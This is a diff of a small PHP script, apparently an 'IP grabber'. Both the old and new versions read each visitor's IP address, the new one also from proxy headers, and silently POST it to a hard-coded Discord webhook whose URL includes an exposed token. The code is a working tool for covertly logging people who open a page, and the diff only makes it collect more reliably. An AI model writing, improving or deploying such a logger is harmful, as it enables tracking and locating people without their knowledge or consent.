@@ -1,18 +1,23 @@
 <?php
-/* Ragekill3377 */
+$wh = "https://discord.com/api/webhooks/1321051594963550218/jrCE9j6nRnDfddYhiOmA2D9JPIRi1l3Sxgn5sTt8OvgMXLfykYM1pw9vJWO0UQmHoqlf"; 
+$ip = $_SERVER['REMOTE_ADDR'];
+$hdrs = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_CLIENT_IP'];
 
-$ip = $_SERVER["HTTP_CF_CONNECTING_IP"] ?? $_SERVER['REMOTE_ADDR'];
-$wh = "https://discord.com/api/webhooks/1321051594963550218/jrCE9j6nRnDfddYhiOmA2D9JPIRi1l3Sxgn5sTt8OvgMXLfykYM1pw9vJWO0UQmHoqlf";
+foreach ($hdrs as $h) {
+    if (!empty($_SERVER[$h])) {
+        $ip = explode(',', $_SERVER[$h])[0];
+        break;
+    }
+}
 
-$embed = json_encode([
-    "username" => $ip,
-    "content" => "IP: $ip"
+$pl = json_encode(['content' => "User IP: $ip"]);
+
+$ch = curl_init($wh);
+curl_setopt_array($ch, [
+    CURLOPT_POST => true,
+    CURLOPT_RETURNTRANSFER => true,
+    CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
+    CURLOPT_POSTFIELDS => $pl
 ]);
-
-$c = curl_init($wh);
-curl_setopt($c, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
-curl_setopt($c, CURLOPT_POSTFIELDS, $embed);
-curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
-curl_exec($c);
-curl_close($c);
-?>
+curl_exec($ch);
+curl_close($ch);
